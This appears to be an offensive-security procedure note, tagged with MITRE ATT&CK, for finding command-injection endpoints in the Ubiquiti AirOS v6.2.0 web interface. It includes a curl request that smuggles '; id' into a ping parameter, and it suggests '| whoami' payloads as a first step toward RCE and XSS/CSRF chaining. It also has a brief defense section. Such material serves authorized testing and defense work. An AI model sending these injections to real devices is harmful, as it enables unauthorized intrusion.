---
tags:
  - command-injection
  - recon
  - iot
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-command-injection-test]]'
platforms:
  - Embedded
  - IoT
  - Firmware
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 43b05058-d2da-44df-95dd-2169e7567b6e
created_at: '2025-12-14T17:27:35.826Z'
updated_at: '2025-12-14T17:27:35.826Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Identify-Vulnerable-Endpoints-for-Command-Injection-in-AirOS

## Summary

This procedure identifies endpoints in Ubiquiti AirMax AirOS v6.2.0 web interface that are susceptible to command injection by testing input parameters with crafted payloads designed to bypass validation filters, enabling the discovery of injection points for subsequent RCE exploitation.

## Description

In AirOS v6.2.0 on TI, XW, and XM boards, certain endpoints process user input strings without adequate sanitization, allowing attackers to append executable commands using separators like semicolons or pipes. This procedure involves manual testing of configuration, diagnostic, and status endpoints to find these flaws. Prerequisites include network access to the device's HTTP interface. Expected outcomes are confirmation of injectable endpoints, setting the stage for full exploitation when combined with other vulnerabilities.

## Requirements

1. Network access to the AirOS device management interface (HTTP/HTTPS on port 80/443)
2. HTTP client like curl or browser for sending test requests
3. Basic knowledge of the device's web endpoints (e.g., /cgi-bin/webproc)

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and whitelisting on all endpoints
- Use Web Application Firewall (WAF) rules to detect command injection patterns like `;`, `|`, or backticks
- Enable logging of all input parameters and monitor for anomalous responses

## Objectives

1. Locate endpoints accepting unsanitized input strings
2. Verify bypass of existing filters with crafted payloads
3. Prepare for chaining with XSS/CSRF for automated exploitation

## Instructions

### Step 1: Access Device Interface and Enumerate Endpoints

**Context**: Gain initial access to the AirOS web interface and identify potential input-accepting endpoints like configuration upload or ping tools.

Navigate to the device's IP in a browser or use curl to probe common paths.

**Command** ([[commands/curl-command-injection-test]]):
```bash
curl -v 'http://target-device-ip/' --head
```

> This reconnaissance command lists available endpoints or forms. Expected output includes HTTP responses revealing CGI scripts or forms with input fields.

### Step 2: Test for Command Injection

**Context**: Send crafted inputs to suspected endpoints to check if commands can be injected and executed, bypassing filters that might strip obvious malicious characters.

Use payloads like `value; id` or `value | whoami` in POST parameters.

**Command** ([[commands/curl-command-injection-test]]):
```bash
curl -X POST 'http://target-device-ip/cgi-bin/webproc' -d 'action=ping&host=8.8.8.8; id' -H 'Content-Type: application/x-www-form-urlencoded'
```

> Explanation: This injects `; id` into a ping endpoint, executing the `id` command if vulnerable. Expected output: Response body containing UID/GID info, indicating successful injection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-command-injection-test]]

## Tools Used


## Tags

- command-injection
- recon
- iot
